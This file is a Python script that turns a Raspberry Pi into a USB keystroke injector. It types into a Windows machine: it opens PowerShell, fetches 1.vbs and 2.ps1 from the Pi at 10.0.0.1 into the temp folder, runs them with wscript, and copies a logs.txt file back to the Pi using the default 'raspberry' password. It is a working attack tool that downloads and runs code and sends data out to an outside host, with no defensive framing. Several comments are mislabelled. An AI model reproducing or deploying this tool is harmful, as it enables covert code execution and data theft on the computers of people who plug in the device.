from time import sleep

# Handles the serial connection between the Pi and the PC
NULL_CHAR = chr(0)
HID_DEVICE = '/dev/hidg0'

# Function to write the report to the HID device
def write_report(report):
    with open(HID_DEVICE, 'rb+') as fd:
        fd.write(report.encode())

# Character map for USB HID codes
CHAR_MAP = {
    'a': (0, 4), 'b': (0, 5), 'c': (0, 6), 'd': (0, 7), 'e': (0, 8), 'f': (0, 9),
    'g': (0, 10), 'h': (0, 11), 'i': (0, 12), 'j': (0, 13), 'k': (0, 14), 'l': (0, 15),
    'm': (0, 16), 'n': (0, 17), 'o': (0, 18), 'p': (0, 19), 'q': (0, 20), 'r': (0, 21),
    's': (0, 22), 't': (0, 23), 'u': (0, 24), 'v': (0, 25), 'w': (0, 26), 'x': (0, 27),
    'y': (0, 28), 'z': (0, 29), '1': (0, 30), '2': (0, 31), '3': (0, 32), '4': (0, 33),
    '5': (0, 34), '6': (0, 35), '7': (0, 36), '8': (0, 37), '9': (0, 38), '0': (0, 39),
    '\n': (0, 40), ' ': (0, 44), '-': (0, 45), '=': (0, 46), '[': (0, 47), ']': (0, 48),
    '\\': (0, 49), ';': (0, 51), "'": (0, 52), ',': (0, 54), '.': (0, 55), '/': (0, 56),
    '`': (0, 53), '!': (2, 30), '@': (2, 31), '#': (2, 32), '$': (2, 33), '%': (2, 34),
    '^': (2, 35), '&': (2, 36), '*': (2, 37), '(': (2, 38), ')': (2, 39), '_': (2, 45),
    '+': (2, 46), '{': (2, 47), '}': (2, 48), '|': (2, 49), ':': (2, 51), '"': (2, 52),
    '<': (2, 54), '>': (2, 55), '?': (2, 56), '~': (2, 53), 'A': (2, 4), 'B': (2, 5),
    'C': (2, 6), 'D': (2, 7), 'E': (2, 8), 'F': (2, 9), 'G': (2, 10), 'H': (2, 11),
    'I': (2, 12), 'J': (2, 13), 'K': (2, 14), 'L': (2, 15), 'M': (2, 16), 'N': (2, 17),
    'O': (2, 18), 'P': (2, 19), 'Q': (2, 20), 'R': (2, 21), 'S': (2, 22), 'T': (2, 23),
    'U': (2, 24), 'V': (2, 25), 'W': (2, 26), 'X': (2, 27), 'Y': (2, 28), 'Z': (2, 29),
    'F1': (0, 58), 'F2': (0, 59), 'F3': (0, 60), 'F4': (0, 61), 'F5': (0, 62), 'F6': (0, 63),
    'F7': (0, 64), 'F8': (0, 65), 'F9': (0, 66), 'F10': (0, 67), 'F11': (0, 68), 'F12': (0, 69),
    'LEFTCTRL': (1, 0), 'LEFTSHIFT': (2, 0), 'LEFTALT': (4, 0), 'LEFTWIN': (8, 0),
    'RIGHTCTRL': (16, 0), 'RIGHTSHIFT': (32, 0), 'RIGHTALT': (64, 0), 'RIGHTWIN': (128, 0)
}

# Function to convert a string into HID reports
def type_string(input_string):
    for char in input_string:
        if char in CHAR_MAP:
            # Get the modifier and keycode for the character
            modifier, keycode = CHAR_MAP[char]
            # Send the key press report
            write_report(chr(modifier) + NULL_CHAR + chr(keycode) + NULL_CHAR * 5)
            # Send the key release report
            write_report(NULL_CHAR * 8)
        sleep(0.01)  # Small delay between key presses for reliability

# Example: Press WIN + R, type Command Prompt command, and press ENTER
def run_cmd_and_check_os():
    # Press Windows + R
    write_report(chr(0x08) + NULL_CHAR + chr(0x15) + NULL_CHAR * 5)  # Modifier 0x08 for Windows key, Keycode 0x15 for 'R'
    write_report(NULL_CHAR * 8)  # Release all keys
    sleep(0.3)

    # Type "cmd"
    type_string("powershell")
    write_report(NULL_CHAR * 2 + chr(40) + NULL_CHAR * 5)  # Keycode 40 for Enter
    write_report(NULL_CHAR * 8)  # Release all keys
    sleep(1)  # Small delay to allow Command Prompt to open

    # Type the SSH command
    type_string("scp pi@10.0.0.1:/home/1.vbs pi@10.0.0.1:/home/2.ps1 $env:TEMP\n")
    write_report(NULL_CHAR * 2 + chr(40) + NULL_CHAR * 5)  # Keycode 40 for Enter
    write_report(NULL_CHAR * 8)  # Release all keys
    sleep(1)

    type_string("raspberry")  # Default password for the pi user
    write_report(NULL_CHAR * 2 + chr(40) + NULL_CHAR * 5)  # Keycode 40 for Enter
    write_report(NULL_CHAR * 8)  # Release all keys
    sleep(0.5)

    type_string("raspberry")  # Default password for the pi user
    write_report(NULL_CHAR * 2 + chr(40) + NULL_CHAR * 5)  # Keycode 40 for Enter
    write_report(NULL_CHAR * 8)  # Release all keys
    sleep(0.5)

    type_string("cd $env:TEMP")  # Default password for the pi user
    write_report(NULL_CHAR * 2 + chr(40) + NULL_CHAR * 5)  # Keycode 40 for Enter
    write_report(NULL_CHAR * 8)  # Release all keys
    sleep(0.3)

    type_string("wscript.exe 1.vbs 2.ps1")  # Default password for the pi user
    write_report(NULL_CHAR * 2 + chr(40) + NULL_CHAR * 5)  # Keycode 40 for Enter
    write_report(NULL_CHAR * 8)  # Release all keys
    sleep(5)

    type_string("scp $env:TEMP\logs.txt pi@10.0.0.1:/home/pi")  # Default password for the pi user
    write_report(NULL_CHAR * 2 + chr(40) + NULL_CHAR * 5)  # Keycode 40 for Enter
    write_report(NULL_CHAR * 8)  # Release all keys
    sleep(5)

    type_string("raspberry")  # Default password for the pi user
    write_report(NULL_CHAR * 2 + chr(40) + NULL_CHAR * 5)  # Keycode 40 for Enter
    write_report(NULL_CHAR * 8)  # Release all keys
    sleep(0.5)

# Run the function
run_cmd_and_check_os()